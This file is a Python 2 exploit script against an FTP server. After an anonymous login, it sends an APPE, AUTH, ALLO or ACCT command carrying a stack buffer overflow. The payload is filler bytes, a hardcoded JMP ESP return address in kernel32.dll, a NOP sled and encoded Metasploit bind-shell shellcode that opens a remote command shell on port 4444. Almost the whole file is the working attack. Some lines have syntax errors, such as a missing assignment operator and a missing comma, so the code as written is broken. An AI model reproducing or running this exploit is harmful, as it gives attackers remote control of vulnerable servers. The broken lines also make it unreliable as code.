import socket, sys, time, struct

if len(sys.argv) < 2: 
	print "[-] Usage: %s <target addr><command>" %sys.argv[0] +"\r"
	print "[-] Example [filename.py 192.168.1.1 CMD]"
	print "[-] Options available: APPE, AUTH, ALLO, ACCT"
	sys.exit(0)

target = sys.argv[1]
command sys.argv[2]
if len(sys.argv) > 2:
	platform = sys.argv[2]

shellcode =(
# msf payload(windows/shell/bind_tcp) > generate -e x86/shikata_ga_nai -b "\x00\xff\x0a\x0d\x3d\x20"
# windows/shell/bind_tcp - 312 bytes (stage 1)
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LPORT=4444, RHOST=192.168.56.101, 
# PayloadUUIDTracking=false, EnableStageEncoding=false, 
# StageEncoderSaveRegisters=, StageEncodingFallback=true, 
# PrependMigrate=false, EXITFUNC=process
# windows/shell/bind_tcp - 240 bytes (stage 2)
# http://www.metasploit.com 
"\xb8\xdf\x12\x05\xea\xda\xc8\xd9\x74\x24\xf4\x5d\x33\xc9" +
"\xb1\x48\x31\x45\x13\x03\x45\x13\x83\xc5\xdb\xf0\xf0\x16" +
"\x0b\x76\xfa\xe6\xcb\x17\x72\x03\xfa\x17\xe0\x47\xac\xa7" +
"\x62\x05\x40\x43\x26\xbe\xd3\x21\xef\xb1\x54\x8f\xc9\xfc" +
"\x65\xbc\x2a\x9e\xe5\xbf\x7e\x40\xd4\x0f\x73\x81\x11\x6d" +
"\x7e\xd3\xca\xf9\x2d\xc4\x7f\xb7\xed\x6f\x33\x59\x76\x93" +
"\x83\x58\x57\x02\x98\x02\x77\xa4\x4d\x3f\x3e\xbe\x92\x7a" +
"\x88\x35\x60\xf0\x0b\x9c\xb9\xf9\xa0\xe1\x76\x08\xb8\x26" +
"\xb0\xf3\xcf\x5e\xc3\x8e\xd7\xa4\xbe\x54\x5d\x3f\x18\x1e" +
"\xc5\x9b\x99\xf3\x90\x68\x95\xb8\xd7\x37\xb9\x3f\x3b\x4c" +
"\xc5\xb4\xba\x83\x4c\x8e\x98\x07\x15\x54\x80\x1e\xf3\x3b" +
"\xbd\x41\x5c\xe3\x1b\x09\x70\xf0\x11\x50\x1c\x35\x18\x6b" +
"\xdc\x51\x2b\x18\xee\xfe\x87\xb6\x42\x76\x0e\x40\xa5\xad" +
"\xf6\xde\x58\x4e\x07\xf6\x9e\x1a\x57\x60\x37\x23\x3c\x70" +
"\xb8\xf6\xa9\x7b\x1f\xa9\xcf\x81\xf5\x48\x7a\x78\x61\xa1" +
"\x75\xa3\x91\xca\x5f\xcc\x39\x37\x60\xe2\xe5\xbe\x86\x6e" +
"\x05\x97\x11\x07\xe7\xcc\xa9\xb0\x18\x27\x82\x56\x51\x21" +
"\x15\x58\x62\x67\x31\xce\xe8\x64\x85\xef\xef\xa0\xad\x78" +
"\x67\x3e\x3c\xca\x16\x3f\x15\xbe\xd8\xd5\x92\x69\x8f\x41" +
"\x99\x4c\xe7\xcd\x62\xbb\x7c\xc7\xf6\x04\xea\x28\x17\x85" +
"\xea\x7e\x7d\x85\x82\x26\x25\xd6\xb7\x28\xf0\x4a\x64\xbd" +
"\xfb\x3a\xd9\x16\x94\xc0\x04\x50\x3b\x3a\x63\x60\x07\xed" +
"\x4d\x16\x69\x2d"+
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" +
"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" +
"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" +
"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" +
"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" +
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" +
"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" +
"\x12\xeb\x86\x5d\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57" +
"\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01" +
"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46" +
"\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89" +
"\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb" +
"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c" +
"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53" +
"\xff\xd5")

#7C874413 FFE4 JMP  ESP kernel32.dll
ret = struct.pack('<L' 0x7C874413)
padding = "\x90" * 150
crash = "\x41" * 246 + ret + padding + shellcode
print "Connecting to " + target
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((target, 21))
except:
	print "[-] Connetion to "+target+" falied..!!"
	sys.exit(0)

print "[*]Sending " + str(len(crash)) +  " " + command + "byte crash...."

s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS \r\n")
s.recv(1024)
s.send(command + " " + crash + "\r\n")
time.sleep(4)
